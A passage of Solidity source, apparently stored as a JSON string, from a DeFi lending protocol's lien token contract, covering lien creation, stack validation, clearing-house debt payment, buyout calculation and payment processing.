PayeeChanged(id, address(0));\n    super.transferFrom(from, to, id);\n  }\n\n  function ASTARIA_ROUTER() public view returns (IAstariaRouter) {\n    return _loadLienStorageSlot().ASTARIA_ROUTER;\n  }\n\n  function COLLATERAL_TOKEN() public view returns (ICollateralToken) {\n    return _loadLienStorageSlot().COLLATERAL_TOKEN;\n  }\n\n  function _exists(uint256 tokenId) internal view returns (bool) {\n    return _loadERC721Slot()._ownerOf[tokenId] != address(0);\n  }\n\n  function createLien(ILienToken.LienActionEncumber memory params)\n    external\n    requiresAuth\n    validateStack(params.lien.collateralId, params.stack)\n    returns (\n      uint256 lienId,\n      Stack[] memory newStack,\n      uint256 lienSlope\n    )\n  {\n    LienStorage storage s = _loadLienStorageSlot();\n    //0 - 4 are valid\n    Stack memory newStackSlot;\n    (lienId, newStackSlot) = _createLien(s, params);\n\n    newStack = _appendStack(s, params.stack, newStackSlot);\n    s.collateralStateHash[params.lien.collateralId] = keccak256(\n      abi.encode(newStack)\n    );\n\n    lienSlope = calculateSlope(newStackSlot);\n    emit AddLien(\n      params.lien.collateralId,\n      uint8(params.stack.length),\n      lienId,\n      newStackSlot\n    );\n    emit LienStackUpdated(\n      params.lien.collateralId,\n      uint8(params.stack.length),\n      StackAction.ADD,\n      uint8(newStack.length)\n    );\n  }\n\n  function _createLien(\n    LienStorage storage s,\n    ILienToken.LienActionEncumber memory params\n  ) internal returns (uint256 newLienId, ILienToken.Stack memory newSlot) {\n    if (s.collateralStateHash[params.lien.collateralId] == ACTIVE_AUCTION) {\n      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);\n    }\n    if (\n      params.lien.details.liquidationInitialAsk < params.amount ||\n      params.lien.details.liquidationInitialAsk == 0\n    ) {\n      revert InvalidState(InvalidStates.INVALID_LIQUIDATION_INITIAL_ASK);\n    }\n\n    if (params.stack.length > 0) {\n      if (params.lien.collateralId != params.stack[0].lien.collateralId) {\n        revert InvalidState(InvalidStates.COLLATERAL_MISMATCH);\n      }\n\n      if (params.lien.token != params.stack[0].lien.token) {\n        revert InvalidState(InvalidStates.ASSET_MISMATCH);\n      }\n    }\n\n    newLienId = uint256(keccak256(abi.encode(params.lien)));\n    Point memory point = Point({\n      lienId: newLienId,\n      amount: params.amount.safeCastTo88(),\n      last: block.timestamp.safeCastTo40(),\n      end: (block.timestamp + params.lien.details.duration).safeCastTo40()\n    });\n    _mint(params.receiver, newLienId);\n    return (newLienId, Stack({lien: params.lien, point: point}));\n  }\n\n  function _appendStack(\n    LienStorage storage s,\n    Stack[] memory stack,\n    Stack memory newSlot\n  ) internal returns (Stack[] memory newStack) {\n    if (stack.length >= s.maxLiens) {\n      revert InvalidState(InvalidStates.MAX_LIENS);\n    }\n\n    newStack = new Stack[](stack.length + 1);\n    newStack[stack.length] = newSlot;\n\n    uint256 potentialDebt = _getOwed(newSlot, newSlot.point.end);\n    for (uint256 i = stack.length; i > 0; ) {\n      uint256 j = i - 1;\n      newStack[j] = stack[j];\n      if (block.timestamp >= newStack[j].point.end) {\n        revert InvalidState(InvalidStates.EXPIRED_LIEN);\n      }\n\n      unchecked {\n        potentialDebt += _getOwed(newStack[j], newStack[j].point.end);\n      }\n      if (potentialDebt > newStack[j].lien.details.liquidationInitialAsk) {\n        revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);\n      }\n\n      unchecked {\n        --i;\n      }\n    }\n    if (\n      stack.length > 0 && potentialDebt > newSlot.lien.details.maxPotentialDebt\n    ) {\n      revert InvalidState(InvalidStates.DEBT_LIMIT);\n    }\n  }\n\n  function payDebtViaClearingHouse(\n    address token,\n    uint256 collateralId,\n    uint256 payment,\n    AuctionStack[] memory auctionStack\n  ) external {\n    LienStorage storage s = _loadLienStorageSlot();\n    require(\n      msg.sender == address(s.COLLATERAL_TOKEN.getClearingHouse(collateralId))\n    );\n\n    _payDebt(s, token, payment, msg.sender, auctionStack);\n    delete s.collateralStateHash[collateralId];\n  }\n\n  function _payDebt(\n    LienStorage storage s,\n    address token,\n    uint256 payment,\n    address payer,\n    AuctionStack[] memory stack\n  ) internal returns (uint256 totalSpent) {\n    uint256 i;\n    for (; i < stack.length;) {\n      uint256 spent;\n      unchecked {\n        spent = _paymentAH(s, token, stack, i, payment, payer);\n        totalSpent += spent;\n        payment -= spent;\n        ++i;\n      }\n    }\n  }\n\n  function getAuctionData(uint256 collateralId)\n    external\n    view\n    returns (AuctionData memory)\n  {\n    return _loadLienStorageSlot().auctionData[collateralId];\n  }\n\n  function getAuctionLiquidator(uint256 collateralId)\n    external\n    view\n    returns (address liquidator)\n  {\n    liquidator = _loadLienStorageSlot().auctionData[collateralId].liquidator;\n    if (liquidator == address(0)) {\n      revert InvalidState(InvalidStates.COLLATERAL_NOT_LIQUIDATED);\n    }\n  }\n\n  function getAmountOwingAtLiquidation(ILienToken.Stack calldata stack)\n    public\n    view\n    returns (uint256)\n  {\n    return\n      _loadLienStorageSlot()\n        .auctionData[stack.lien.collateralId]\n        .stack[stack.point.lienId]\n        .amountOwed;\n  }\n\n  function validateLien(Lien memory lien) public view returns (uint256 lienId) {\n    lienId = uint256(keccak256(abi.encode(lien)));\n    if (!_exists(lienId)) {\n      revert InvalidState(InvalidStates.INVALID_LIEN_ID);\n    }\n  }\n\n  function getCollateralState(uint256 collateralId)\n    external\n    view\n    returns (bytes32)\n  {\n    return _loadLienStorageSlot().collateralStateHash[collateralId];\n  }\n\n  function getBuyout(Stack calldata stack)\n    public\n    view\n    returns (uint256 owed, uint256 buyout)\n  {\n    return _getBuyout(_loadLienStorageSlot(), stack);\n  }\n\n  function _getBuyout(LienStorage storage s, Stack calldata stack)\n    internal\n    view\n    returns (uint256 owed, uint256 buyout)\n  {\n    owed = _getOwed(stack, block.timestamp);\n    buyout =\n      owed +\n      s.ASTARIA_ROUTER.getBuyoutFee(_getRemainingInterest(s, stack));\n  }\n\n  function makePayment(\n    uint256 collateralId,\n    Stack[] calldata stack,\n    uint256 amount\n  )\n    public\n    validateStack(collateralId, stack)\n    returns (Stack[] memory newStack)\n  {\n    return _makePayment(_loadLienStorageSlot(), stack, amount);\n  }\n\n  function makePayment(\n    uint256 collateralId,\n    Stack[] calldata stack,\n    uint8 position,\n    uint256 amount\n  )\n    external\n    validateStack(collateralId, stack)\n    returns (Stack[] memory newStack)\n  {\n    LienStorage storage s = _loadLienStorageSlot();\n    (newStack, ) = _payment(s, stack, position, amount, msg.sender);\n    _updateCollateralStateHash(s, collateralId, newStack);\n  }\n\n  function _paymentAH(\n    LienStorage storage s,\n    address token,\n    AuctionStack[] memory stack,\n    uint256 position,\n    uint256 payment,\n    address payer\n  ) internal returns (uint256) {\n    uint256 lienId = stack[position].lienId;\n    uint256 end = stack[position].end;\n    uint256 owing = stack[position].amountOwed;\n    //checks the lien exists\n    address payee = _getPayee(s, lienId);\n    uint256 remaining = 0;\n    if (owing > payment.safeCastTo88()) {\n      remaining = owing - payment;\n    } else {\n      payment = owing;\n    }\n    if (payment > 0)\n      s.TRANSFER_PROXY.tokenTransferFrom(token, payer, payee, payment);\n\n    delete s.lienMeta[lienId]; //full delete\n    delete stack[position];\n    _burn(lienId);\n\n    if (_isPublicVault(s, payee)) {\n      IPublicVault(payee).updateAfterLiquidationPayment(\n        IPublicVault.LiquidationPaymentParams({remaining: remaining})\n      );\n    }\n    emit Payment(lienId, payment);\n    return payment;\n  }\n\n  /**\n   * @dev Have a specified payer make a payment for the debt against a CollateralToken.\n   * @param stack the stack for the payment\n   * @param totalCapitalAvailable The amount to pay against the debts\n   */\n  function _makePayment(\n    LienStorage storage s,\n    Stack[] calldata stack,\n    uint256 totalCapitalAvailable\n  ) internal returns (Stack[] memory newStack) {\n    newStack = stack;\n    for (uint256 i; i < newStack.length; ) {\n      uint256 oldLength = newStack.length;\n      uint256 spent;\n      (newStack, spent) = _payme"
    }
  ]
}